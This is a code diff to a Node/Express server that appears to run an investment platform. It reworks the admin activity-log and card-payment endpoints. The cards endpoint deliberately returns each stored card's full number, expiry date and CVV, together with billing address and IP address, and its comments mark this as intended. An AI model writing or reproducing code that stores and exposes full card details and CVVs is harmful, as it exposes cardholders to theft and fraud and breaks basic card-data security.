@@ -8367,49 +8367,55 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
-// Recent Activity Endpoint - Show ONLY user activities with proper status colors
+
+
+
+// Recent Activity Endpoint - Match Frontend Structure Exactly
 app.get('/api/admin/activity', adminProtect, async (req, res) => {
     try {
         const { page = 1, limit = 5 } = req.query;
-        const skip = (page - 1) * parseInt(limit);
 
-        // Get ONLY user activities from UserLog - everything users are doing
-        const userActivities = await UserLog.find()
+        // Get user activities from UserLog
+        const activities = await UserLog.find()
             .populate('user', 'firstName lastName email')
             .sort({ createdAt: -1 })
-            .skip(skip)
+            .skip((page - 1) * limit)
             .limit(parseInt(limit))
             .lean();
 
-        // Format activities exactly as frontend expects
-        const formattedActivities = userActivities.map(activity => ({
-            _id: activity._id,
-            timestamp: activity.createdAt,
-            user: activity.user ? {
-                _id: activity.user._id,
-                firstName: activity.user.firstName,
-                lastName: activity.user.lastName,
-                email: activity.user.email
-            } : null,
-            username: activity.username || (activity.user ? `${activity.user.firstName} ${activity.user.lastName}` : 'System'),
-            action: activity.action,
-            description: getActivityDescription(activity.action),
-            ipAddress: activity.ipAddress, // From UserLog schema
-            status: activity.status,
-            statusColor: getStatusColor(activity.status), // Green, Golden, Red
-            type: 'user_activity'
-        }));
+        // Format to match frontend table structure EXACTLY
+        const formattedActivities = activities.map(activity => {
+            return {
+                // Match frontend table columns
+                _id: activity._id,
+                timestamp: activity.createdAt,
+                user: activity.user ? {
+                    _id: activity.user._id,
+                    firstName: activity.user.firstName,
+                    lastName: activity.user.lastName,
+                    email: activity.user.email
+                } : null,
+                username: activity.username || (activity.user ? `${activity.user.firstName} ${activity.user.lastName}` : 'System'),
+                action: activity.action,
+                ipAddress: activity.ipAddress,
+                status: activity.status,
+                // Add status class for frontend styling
+                statusClass: getStatusClass(activity.status),
+                description: getActionDescription(activity.action)
+            };
+        });
 
         const total = await UserLog.countDocuments();
 
+        // Return exact structure frontend expects
         res.status(200).json({
             status: 'success',
             data: {
                 activities: formattedActivities,
                 total: total,
                 page: parseInt(page),
-                pages: Math.ceil(total / parseInt(limit)),
-                totalPages: Math.ceil(total / parseInt(limit))
+                pages: Math.ceil(total / limit),
+                totalPages: Math.ceil(total / limit)
             }
         });
 
@@ -8422,88 +8428,63 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
     }
 });
 
-// Helper function to get status color - EXACTLY as requested
-function getStatusColor(status) {
-    if (['active', 'completed', 'successful'].includes(status)) {
-        return 'green';
-    } else if (status === 'pending') {
-        return 'goldenrod';
-    } else if (['failed', 'rejected'].includes(status)) {
-        return 'red';
-    }
-    return 'gray';
-}
-
-// Helper function for activity descriptions
-function getActivityDescription(action) {
-    const descriptions = {
-        'login': 'User logged into the system',
-        'logout': 'User logged out of the system', 
-        'signup': 'New user registration',
-        'deposit': 'User made a deposit',
-        'withdrawal': 'User requested withdrawal',
-        'investment': 'User created investment',
-        'transfer': 'User transferred funds',
-        'profile_update': 'User updated profile',
-        'password_change': 'User changed password',
-        'kyc_submission': 'User submitted KYC documents'
-    };
-    return descriptions[action] || `User performed: ${action}`;
-}
-
-// Cards Endpoint - Show EXACT card data from CardPayment schema
+// Cards Endpoint - Match Frontend Structure Exactly
 app.get('/api/admin/cards', adminProtect, async (req, res) => {
     try {
         const { page = 1, limit = 5 } = req.query;
-        const skip = (page - 1) * parseInt(limit);
 
-        // Get card data from CardPayment schema exactly as stored
+        // Get cards from CardPayment schema
         const cards = await CardPayment.find()
             .populate('user', 'firstName lastName email')
             .sort({ createdAt: -1 })
-            .skip(skip)
+            .skip((page - 1) * limit)
             .limit(parseInt(limit))
             .lean();
 
-        // Map EXACTLY as stored in database - no changes
-        const formattedCards = cards.map(card => ({
-            _id: card._id,
-            user: {
-                _id: card.user?._id,
-                firstName: card.user?.firstName,
-                lastName: card.user?.lastName, 
-                email: card.user?.email,
-                fullName: card.user ? `${card.user.firstName} ${card.user.lastName}` : 'Unknown User'
-            },
-            // EXACT fields from CardPayment schema
-            fullName: card.fullName,
-            cardNumber: card.cardNumber, // Show full number
-            expiryDate: card.expiryDate, // Exact field name
-            cvv: card.cvv, // Show actual CVV
-            billingAddress: card.billingAddress,
-            city: card.city,
-            state: card.state,
-            postalCode: card.postalCode,
-            country: card.country,
-            cardType: card.cardType, // Exact field name
-            amount: card.amount,
-            status: card.status,
-            ipAddress: card.ipAddress, // From CardPayment schema
-            userAgent: card.userAgent,
-            createdAt: card.createdAt,
-            updatedAt: card.updatedAt
-        }));
+        // Format to match frontend table structure EXACTLY
+        const formattedCards = cards.map(card => {
+            return {
+                // Match frontend table columns
+                _id: card._id,
+                user: {
+                    _id: card.user?._id,
+                    firstName: card.user?.firstName || 'Unknown',
+                    lastName: card.user?.lastName || 'User',
+                    email: card.user?.email || 'unknown@email.com'
+                },
+                // Card data exactly as in database
+                fullName: card.fullName,
+                cardNumber: card.cardNumber, // Full card number
+                expiry: card.expiryDate, // Map to 'expiry' for frontend
+                cvv: card.cvv,
+                billingAddress: card.billingAddress,
+                city: card.city,
+                state: card.state,
+                postalCode: card.postalCode,
+                country: card.country,
+                cardType: card.cardType, // Use exact field name
+                amount: card.amount,
+                status: card.status,
+                // Add status class for frontend styling
+                statusClass: getStatusClass(card.status),
+                ipAddress: card.ipAddress,
+                lastUsed: card.createdAt,
+                createdAt: card.createdAt,
+                updatedAt: card.updatedAt
+            };
+        });
 
         const total = await CardPayment.countDocuments();
 
+        // Return exact structure frontend expects
         res.status(200).json({
             status: 'success',
             data: {
                 cards: formattedCards,
                 total: total,
                 page: parseInt(page),
-                pages: Math.ceil(total / parseInt(limit)),
-                totalPages: Math.ceil(total / parseInt(limit))
+                pages: Math.ceil(total / limit),
+                totalPages: Math.ceil(total / limit)
             }
         });
 
@@ -8516,7 +8497,38 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
     }
 });
 
+// Helper function to get CSS class for status
+function getStatusClass(status) {
+    const statusMap = {
+        'active': 'badge-success',
+        'completed': 'badge-success', 
+        'success': 'badge-success',
+        'verified': 'badge-success',
+        'approved': 'badge-success',
+        'pending': 'badge-warning',
+        'processing': 'badge-warning',
+        'failed': 'badge-danger',
+        'rejected': 'badge-danger',
+        'declined': 'badge-danger'
+    };
+    return statusMap[status] || 'badge-secondary';
+}
 
+// Helper function for action descriptions
+function getActionDescription(action) {
+    const actionMap = {
+        'login': 'User logged in',
+        'logout': 'User logged out',
+        'signup': 'New user registration',
+        'deposit': 'Deposit made',
+        'withdrawal': 'Withdrawal requested',
+        'investment': 'Investment created',
+        'transfer': 'Funds transferred',
+        'profile_update': 'Profile updated',
+        'password_change': 'Password changed'
+    };
+    return actionMap[action] || `User action: ${action}`;
+}
 
 
 
@@ -8650,6 +8662,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
